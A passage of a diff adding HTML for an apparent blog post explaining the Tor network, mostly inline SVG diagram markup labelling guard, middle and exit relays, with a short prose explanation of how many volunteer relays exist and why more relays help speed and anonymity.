+         style=&#34;fill:#ffffff&#34;&gt;
+&lt;/g&gt;
+      &lt;g
+         id=&#34;g6068&#34;
+         style=&#34;fill:#ffffff&#34;&gt;
+&lt;/g&gt;
+      &lt;g
+         id=&#34;g6070&#34;
+         style=&#34;fill:#ffffff&#34;&gt;
+&lt;/g&gt;
+      &lt;g
+         id=&#34;g6072&#34;
+         style=&#34;fill:#ffffff&#34;&gt;
+&lt;/g&gt;
+      &lt;g
+         id=&#34;g6074&#34;
+         style=&#34;fill:#ffffff&#34;&gt;
+&lt;/g&gt;
+      &lt;g
+         id=&#34;g6076&#34;
+         style=&#34;fill:#ffffff&#34;&gt;
+&lt;/g&gt;
+      &lt;g
+         id=&#34;g6078&#34;
+         style=&#34;fill:#ffffff&#34;&gt;
+&lt;/g&gt;
+      &lt;g
+         id=&#34;g6080&#34;
+         style=&#34;fill:#ffffff&#34;&gt;
+&lt;/g&gt;
+    &lt;/g&gt;
+    &lt;path
+       style=&#34;fill:none;stroke:#96281b;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+       d=&#34;m 292.9,394.7 c 0,0 85.8,-133.3 186.8,20.2&#34;
+       id=&#34;path6115&#34;
+       inkscape:connector-curvature=&#34;0&#34; /&gt;
+    &lt;path
+       style=&#34;fill:none;stroke:#000000;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+       d=&#34;m 479.8,414.9 c 0,0 87.8,-141.4 56.5,63.6&#34;
+       id=&#34;path6625&#34;
+       inkscape:connector-curvature=&#34;0&#34; /&gt;
+    &lt;path
+       style=&#34;fill:none;stroke:#90c695;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+       d=&#34;m 401.4,247.1 c 0,0 -142.8,-90.7 -216.4,33.5&#34;
+       id=&#34;path6627&#34;
+       inkscape:connector-curvature=&#34;0&#34;
+       transform=&#34;translate(135.6,230.9)&#34; /&gt;
+    &lt;path
+       style=&#34;fill:none;stroke:#f4b350;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+       d=&#34;m 185.7,280.0 c 0,0 17.8,-149.2 -93.5,-107.1&#34;
+       id=&#34;path6629&#34;
+       inkscape:connector-curvature=&#34;0&#34;
+       transform=&#34;translate(135.6,230.9)&#34; /&gt;
+    &lt;path
+       style=&#34;fill:none;stroke:#96281b;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+       d=&#34;m 688.2,283.4 39.3,0&#34;
+       id=&#34;path6631&#34;
+       inkscape:connector-curvature=&#34;0&#34; /&gt;
+    &lt;path
+       style=&#34;fill:none;stroke:#000000;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+       d=&#34;m 688.7,338.5 39.3,0&#34;
+       id=&#34;path6631-4&#34;
+       inkscape:connector-curvature=&#34;0&#34; /&gt;
+    &lt;path
+       style=&#34;fill:none;stroke:#90c695;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+       d=&#34;m 688.7,393.5 39.3,0&#34;
+       id=&#34;path6631-6&#34;
+       inkscape:connector-curvature=&#34;0&#34; /&gt;
+    &lt;path
+       style=&#34;fill:none;stroke:#f4b350;stroke-width:3;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none&#34;
+       d=&#34;m 688.7,452.1 39.3,0&#34;
+       id=&#34;path6631-0&#34;
+       inkscape:connector-curvature=&#34;0&#34; /&gt;
+    &lt;text
+       xml:space=&#34;preserve&#34;
+       style=&#34;font-size:20px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI&#34;
+       x=&#34;740.7&#34;
+       y=&#34;288.3&#34;
+       id=&#34;text6740&#34;
+       sodipodi:linespacing=&#34;125%&#34;&gt;&lt;tspan
+         sodipodi:role=&#34;line&#34;
+         x=&#34;740.7&#34;
+         y=&#34;288.3&#34;
+         id=&#34;tspan6742&#34;&gt;&lt;tspan
+           x=&#34;740.7&#34;
+           y=&#34;288.3&#34;
+           style=&#34;font-weight:300;fill:#ffffff;&#34;
+           id=&#34;tspan6744&#34;&gt;Guard Node&lt;/tspan&gt;&lt;/tspan&gt;&lt;/text&gt;
+    &lt;text
+       xml:space=&#34;preserve&#34;
+       style=&#34;font-size:20px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI&#34;
+       x=&#34;743.0&#34;
+       y=&#34;344.3&#34;
+       id=&#34;text6746&#34;
+       sodipodi:linespacing=&#34;125%&#34;&gt;&lt;tspan
+         sodipodi:role=&#34;line&#34;
+         x=&#34;743.0&#34;
+         y=&#34;344.3&#34;
+         id=&#34;tspan6748&#34;&gt;&lt;tspan
+           x=&#34;743.0&#34;
+           y=&#34;344.3&#34;
+           style=&#34;font-weight:300;fill:#ffffff;&#34;
+           id=&#34;tspan6750&#34;&gt;Middle Node&lt;/tspan&gt;&lt;/tspan&gt;&lt;/text&gt;
+    &lt;text
+       xml:space=&#34;preserve&#34;
+       style=&#34;font-size:20px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI&#34;
+       x=&#34;741.4&#34;
+       y=&#34;399.8&#34;
+       id=&#34;text6752&#34;
+       sodipodi:linespacing=&#34;125%&#34;&gt;&lt;tspan
+         sodipodi:role=&#34;line&#34;
+         x=&#34;741.4&#34;
+         y=&#34;399.8&#34;
+         id=&#34;tspan6754&#34;&gt;&lt;tspan
+           x=&#34;741.4&#34;
+           y=&#34;399.8&#34;
+           style=&#34;font-weight:300;fill:#ffffff;&#34;
+           id=&#34;tspan6756&#34;&gt;Exit Node&lt;/tspan&gt;&lt;/tspan&gt;&lt;/text&gt;
+    &lt;text
+       xml:space=&#34;preserve&#34;
+       style=&#34;font-size:20px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;line-height:125%;letter-spacing:0px;word-spacing:0px;fill:#ffffff;fill-opacity:1;stroke:none;font-family:Segoe UI;-inkscape-font-specification:Segoe UI&#34;
+       x=&#34;742.3&#34;
+       y=&#34;458.5&#34;
+       id=&#34;text6758&#34;
+       sodipodi:linespacing=&#34;125%&#34;&gt;&lt;tspan
+         sodipodi:role=&#34;line&#34;
+         x=&#34;742.3&#34;
+         y=&#34;458.5&#34;
+         id=&#34;tspan6760&#34;&gt;&lt;tspan
+           x=&#34;742.3&#34;
+           y=&#34;458.5&#34;
+           style=&#34;font-weight:300;fill:#ffffff;&#34;
+           id=&#34;tspan6762&#34;&gt;Final Destination&lt;/tspan&gt;&lt;/tspan&gt;&lt;/text&gt;
+  &lt;/g&gt;
+&lt;/svg&gt;
+&lt;/div&gt;
+&lt;br/&gt;
+
+
+&lt;p&gt;Currently, there are &lt;a href=&#34;https://metrics.torproject.org/networksize.html&#34;&gt;about 6000 relays&lt;/a&gt; routing traffic through the Tor network. These relays are located all across the world and run completely by volunteers willing to give up some bandwidth for the cause. It&amp;rsquo;s important to note that most relays don&amp;rsquo;t have special hardware or software to run. They just have the Tor software configured to act as a relay.&lt;/p&gt;
+
+&lt;p&gt;When it comes to speed and anonymity of the Tor network - the more relays, the better! This makes sense, because every relay only has so much bandwidth to offer. Additionally, if there are more relays to choose from, it will be more difficult to track any one user.&lt;/p&gt;
+
+&lt;h3 id=&#34;types-of-relays:b6a2f7f7305d0d4a88042f3de1458bb0&#34;&gt;Types of Relays&lt;/h3&gt;
+
+&lt;p&gt;By default, Tor bounces connections through 3 relays. Each of these have a specific role to play (we&amp;rsquo;ll cover each in more detail in later posts):&lt;/p&gt;
+
+&lt;p&gt;&lt;div style=&#34;padding:10px;background:#3498DB;border-radius:5px;&#34;&gt;
+&lt;svg
+   xmlns:dc=&#34;http://purl.org/dc/elements/1.1/&#34;
+   xmlns:cc=&#34;http://creativecommons.org/ns#&#34;
+   xmlns:rdf=&#34;http://www.w3.org/1999/02/22-rdf-syntax-ns#&#34;
+   xmlns:svg=&#34;http://www.w3.org/2000/svg&#34;
+   xmlns=&#34;http://www.w3.org/2000/svg&#34;
+   width=&#34;100%&#34;
+   height=&#34;1236.6&#34;
+   id=&#34;network&#34;
+   version=&#34;1.1&#34;
+   style=&#34;max-height:300px;&#34;
+   onclick=&#34;e.reset().play(1.25);&#34;
+   viewBox=&#34;0 0 1956 1236&#34;&gt;
+  &lt;defs
+     id=&#34;defs8112&#34; /&gt;
+     &lt;g
+        inkscape:label=&#34;Layer 1&#34;
+        inkscape:groupmode=&#34;layer&#34;
+        id=&#34;layer1&#34;
+        transform=&#34;translate(885.83545,44.405879)&#34;&gt;
+       &lt;g
+          id=&#34;g8200&#34;
+          transform=&#34;matrix(0.38940404,0,0,0.37354888,832.4136,424.91373)&#34;
+          style=&#34;fill:#ffffff&#34;&gt;
+         &lt;g
+            id=&#34;g8160&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   	&lt;path
+      id=&#34;path8162&#34;
+      d=&#34;M 578.766,51.487 V 50.592 H 575.77 35.93 32.934 v 0.895 C 15.272,52.701 2.095,66.753 0,83.808 v 3.002 355.724 c 0,6.898 1.795,12.712 4.791,17.949 6.893,12.137 17.068,18.269 31.14,18.269 h 197.012 v 49.695 h -37.425 c -9.281,0 -16.467,7.218 -16.467,16.48 0,9.262 7.186,16.479 16.467,16.479 h 220.666 c 9.281,0 16.768,-7.218 16.768,-16.479 0,-9.263 -7.486,-16.48 -16.768,-16.48 H 378.759 V 478.752 H 575.77 c 14.078,0 24.343,-6.132 31.14,-18.269 3.085,-5.493 5.091,-11.37 5.091,-17.949 V 86.811 83.809 C 609.905,66.753 595.833,52.701 578.766,51.487 z m 0,35.324 v 355.724 c 0,2.108 -0.895,3.002 -2.996,3.002 H 35.93 c -2.095,0 -2.996,-0.894 -2.996,-3.002 V 86.811 83.809 h 545.831 v 3.002 z&#34;
+      inkscape:connector-curvature=&#34;0&#34;
+      style=&#34;fill:#ffffff&#34; /&gt;
+
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8164&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8166&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8168&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8170&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8172&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8174&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8176&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8178&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8180&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8182&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8184&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8186&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8188&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8190&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8192&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+       &lt;/g&gt;
+       &lt;path
+          id=&#34;path8222&#34;
+          d=&#34;m -228.29943,189.87983 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 V 360.385 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z&#34;
+          inkscape:connector-curvature=&#34;0&#34;
+          style=&#34;fill:#ffffff&#34; /&gt;
+       &lt;g
+          id=&#34;g8414&#34;
+          transform=&#34;matrix(2.4669289,0,0,2.4669289,-885.8347,435.09715)&#34;
+          style=&#34;fill:#ffffff&#34;&gt;
+         &lt;g
+            id=&#34;g8370&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   	&lt;g
+      id=&#34;g8372&#34;
+      style=&#34;fill:#ffffff&#34;&gt;
+   		&lt;path
+      id=&#34;path8374&#34;
+      d=&#34;m 97.265,71.261 c -0.093,-0.108 -0.23,-0.172 -0.374,-0.172 H 0.494 c -0.144,0 -0.28,0.063 -0.374,0.172 -0.094,0.108 -0.136,0.253 -0.115,0.396 0.014,0.09 1.468,9.016 12.753,9.016 h 71.869 c 11.284,0 12.738,-8.926 12.753,-9.016 0.02,-0.143 -0.022,-0.288 -0.115,-0.396 z m -41.323,6.286 h -14.5 v -3.334 h 14.5 v 3.334 z&#34;
+      inkscape:connector-curvature=&#34;0&#34;
+      style=&#34;fill:#ffffff&#34; /&gt;
+
+   		&lt;path
+      id=&#34;path8376&#34;
+      d=&#34;m 10.507,67.619 h 76.37 c 1.104,0 2,-0.896 2,-2 V 18.713 c 0,-1.104 -0.896,-2 -2,-2 h -76.37 c -1.104,0 -2,0.896 -2,2 v 46.906 c 0,1.104 0.896,2 2,2 z m 5,-43.906 h 66.37 V 60.619 H 15.507 V 23.713 z&#34;
+      inkscape:connector-curvature=&#34;0&#34;
+      style=&#34;fill:#ffffff&#34; /&gt;
+
+   	&lt;/g&gt;
+
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8378&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8380&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8382&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8384&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8386&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8388&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8390&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8392&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8394&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8396&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8398&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8400&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8402&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8404&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+         &lt;g
+            id=&#34;g8406&#34;
+            style=&#34;fill:#ffffff&#34;&gt;
+   &lt;/g&gt;
+       &lt;/g&gt;
+       &lt;path
+          id=&#34;path8222-9&#34;
+          d=&#34;m -234.01367,435.59412 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z&#34;
+          inkscape:connector-curvature=&#34;0&#34;
+          style=&#34;fill:#ffffff&#34; /&gt;
+       &lt;path
+          id=&#34;path8222-90&#34;
+          d=&#34;m -242.5851,692.73698 h -114.8306 c -2.06335,0 -3.73222,1.67169 -3.73222,3.73343 v 33.93777 c 0,2.06174 1.66887,3.73222 3.73222,3.73222 h 114.831 c 2.06536,0 3.73262,-1.67048 3.73262,-3.73222 v -33.93536 c 0,-2.06415 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,29.54742 h -49.01236 v -19.60463 h 49.01236 v 19.60463 z m 57.4143,20.51836 h -114.8306 c -2.06335,0 -3.73222,1.67048 -3.73222,3.73222 v 33.93898 c 0,2.06294 1.66887,3.73463 3.73222,3.73463 h 114.831 c 2.06536,0 3.73262,-1.67169 3.73262,-3.73463 v -33.93898 c 0,-2.06174 -1.66766,-3.73222 -3.73302,-3.73222 z m -57.4143,29.04184 h -49.01236 v -19.60502 h 49.01236 v 19.60502 z m 57.4143,20.53889 h -114.8306 c -2.06335,0 -3.73222,1.67411 -3.73222,3.73584 v 33.93777 c 0,2.06134 1.66887,3.73102 3.73222,3.73102 h 114.831 c 2.06536,0 3.73262,-1.66928 3.73262,-3.73102 v -33.93777 c 0,-2.06173 -1.66766,-3.73584 -3.73302,-3.73584 z m -57.4143,30.50664 h -49.01236 v -19.60342 h 49.01236 v 19.60342 z m 25.89933,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73557,6.11437 -6.11035,6.11437 h -39.67859 c -3.37438,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25078 h -29.24271 v -5.34836 h 29.29504 c 0.26083,-3.13648 2.85994,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.20249,0 5.79758,2.47151 6.06244,5.60316 z&#34;
+          inkscape:connector-curvature=&#34;0&#34;
+          style=&#34;fill:#ffffff&#34; /&gt;
+       &lt;path
+          id=&#34;path8222-90-7&#34;
+          d=&#34;M 191.70061,-44.405879 H 76.870013 c -2.063349,0 -3.732221,1.67169 -3.732221,3.733428 v 33.93777 c 0,2.061738 1.668872,3.7322207 3.732221,3.7322207 H 191.70101 c 2.06536,0 3.73262,-1.6704827 3.73262,-3.7322207 v -33.935354 c 0,-2.064154 -1.66766,-3.735844 -3.73302,-3.735844 z M 134.28632,-14.85846 H 85.27395 v -19.604625 h 49.01237 V -14.85846 z M 191.70061,5.6598986 H 76.870013 c -2.063349,0 -3.732221,1.6704828 -3.732221,3.7322208 V 43.331097 c 0,2.062945 1.668872,3.734636 3.732221,3.734636 H 191.70101 c 2.06536,0 3.73262,-1.671691 3.73262,-3.734636 V 9.3921194 c 0,-2.061738 -1.66766,-3.7322208 -3.73302,-3.7322208 z M 134.28632,34.701745 H 85.27395 V 15.096717 h 49.01237 v 19.605028 z m 57.41429,20.538887 H 76.870013 c -2.063349,0 -3.732221,1.674106 -3.732221,3.735844 v 33.93777 c 0,2.061335 1.668872,3.731013 3.732221,3.731013 H 191.70101 c 2.06536,0 3.73262,-1.669275 3.73262,-3.731013 v -33.93777 c 0,-2.061738 -1.66766,-3.735844 -3.73302,-3.735844 z M 134.28632,85.747271 H 85.27395 V 66.143853 h 49.01237 v 19.603418 z m 25.89932,45.955179 h 29.29383 v 5.34837 h -29.24633 v 0.25077 c 0,3.3792 -2.73557,6.11437 -6.11034,6.11437 h -39.6786 c -3.37437,0 -6.11276,-2.73557 -6.11276,-6.11437 v -0.25077 H 79.088736 v -5.34837 h 29.295034 c 0.26084,-3.13648 2.85995,-5.60316 6.06083,-5.60316 h 12.17722 v -12.21988 c 0,-3.37478 2.73516,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.2025,0 5.79758,2.47151 6.06244,5.60316 z&#34;
+          inkscape:connector-curvature=&#34;0&#34;
+          style=&#34;fill:#ffffff&#34; /&gt;
+       &lt;g
+          style=&#34;fill:#ffffff&#34;
+          id=&#34;g8224-3-3&#34;
+          transform=&#34;matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)&#34; /&gt;
+       &lt;g
+          style=&#34;fill:#ffffff&#34;
+          id=&#34;g8226-0-4&#34;
+          transform=&#34;matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)&#34; /&gt;
+       &lt;g
+          style=&#34;fill:#ffffff&#34;
+          id=&#34;g8228-3-0&#34;
+          transform=&#34;matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)&#34; /&gt;
+       &lt;g
+          style=&#34;fill:#ffffff&#34;
+          id=&#34;g8230-50-8&#34;
+          transform=&#34;matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)&#34; /&gt;
+       &lt;g
+          style=&#34;fill:#ffffff&#34;
+          id=&#34;g8232-7-8&#34;
+          transform=&#34;matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)&#34; /&gt;
+       &lt;g
+          style=&#34;fill:#ffffff&#34;
+          id=&#34;g8234-6-1&#34;
+          transform=&#34;matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)&#34; /&gt;
+       &lt;g
+          style=&#34;fill:#ffffff&#34;
+          id=&#34;g8236-7-5&#34;
+          transform=&#34;matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)&#34; /&gt;
+       &lt;g
+          style=&#34;fill:#ffffff&#34;
+          id=&#34;g8238-83-2&#34;
+          transform=&#34;matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)&#34; /&gt;
+       &lt;g
+          style=&#34;fill:#ffffff&#34;
+          id=&#34;g8240-6-3&#34;
+          transform=&#34;matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)&#34; /&gt;
+       &lt;g
+          style=&#34;fill:#ffffff&#34;
+          id=&#34;g8242-4-2&#34;
+          transform=&#34;matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)&#34; /&gt;
+       &lt;g
+          style=&#34;fill:#ffffff&#34;
+          id=&#34;g8244-4-4&#34;
+          transform=&#34;matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)&#34; /&gt;
+       &lt;g
+          style=&#34;fill:#ffffff&#34;
+          id=&#34;g8246-1-6&#34;
+          transform=&#34;matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)&#34; /&gt;
+       &lt;g
+          style=&#34;fill:#ffffff&#34;
+          id=&#34;g8248-9-6&#34;
+          transform=&#34;matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)&#34; /&gt;
+       &lt;g
+          style=&#34;fill:#ffffff&#34;
+          id=&#34;g8250-5-6&#34;
+          transform=&#34;matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)&#34; /&gt;
+       &lt;g
+          style=&#34;fill:#ffffff&#34;
+          id=&#34;g8252-5-2&#34;
+          transform=&#34;matrix(0.40252597,0,0,0.40252597,40.374593,-44.405879)&#34; /&gt;
+       &lt;path
+          id=&#34;path8222-90-4&#34;
+          d=&#34;M 183.12918,244.16555 H 68.298585 c -2.063349,0 -3.732221,1.67169 -3.732221,3.73343 v 33.93777 c 0,2.06174 1.668872,3.73222 3.732221,3.73222 H 183.12958 c 2.06536,0 3.73263,-1.67048 3.73263,-3.73222 v -33.93536 c 0,-2.06415 -1.66767,-3.73584 -3.73303,-3.73584 z m -57.41429,29.54742 H 76.702522 v -19.60463 h 49.012368 v 19.60463 z m 57.41429,20.51836 H 68.298585 c -2.063349,0 -3.732221,1.67048 -3.732221,3.73222 v 33.93898 c 0,2.06294 1.668872,3.73463 3.732221,3.73463 H 183.12958 c 2.06536,0 3.73263,-1.67169 3.73263,-3.73463 v -33.93898 c 0,-2.06174 -1.66767,-3.73222 -3.73303,-3.73222 z m -57.41429,29.04184 H 76.702522 v -19.60502 h 49.012368 v 19.60502 z m 57.41429,20.53889 H 68.298585 c -2.063349,0 -3.732221,1.67411 -3.732221,3.73584 v 33.93777 c 0,2.06134 1.668872,3.73102 3.732221,3.73102 H 183.12958 c 2.06536,0 3.73263,-1.66928 3.73263,-3.73102 V 347.5479 c 0,-2.06173 -1.66767,-3.73584 -3.73303,-3.73584 z M 125.71489,374.3187 H 76.702522 v -19.60342 h 49.012368 v 19.60342 z m 25.89932,45.95518 h 29.29383 v 5.34836 h -29.24633 v 0.25078 c 0,3.3792 -2.73556,6.11437 -6.11034,6.11437 h -39.6786 c -3.37437,0 -6.112756,-2.73557 -6.112756,-6.11437 v -0.25078 H 70.517308 v -5.34836 h 29.295035 c 0.260837,-3.13648 2.859947,-5.60316 6.060837,-5.60316 h 12.17721 v -12.21988 c 0,-3.37478 2.73517,-6.11477 6.10994,-6.11477 h 3.05598 c 3.37518,0 6.11115,2.74039 6.11115,6.11477 v 12.21988 h 12.22431 c 3.2025,0 5.79758,2.47151 6.06244,5.60316 z&#34;
+          inkscape:connector-curvature=&#34;0&#34;
+          style=&#34;fill:#ffffff&#34; /&gt;
+       &lt;path
+          id=&#34;path8222-90-3&#34;
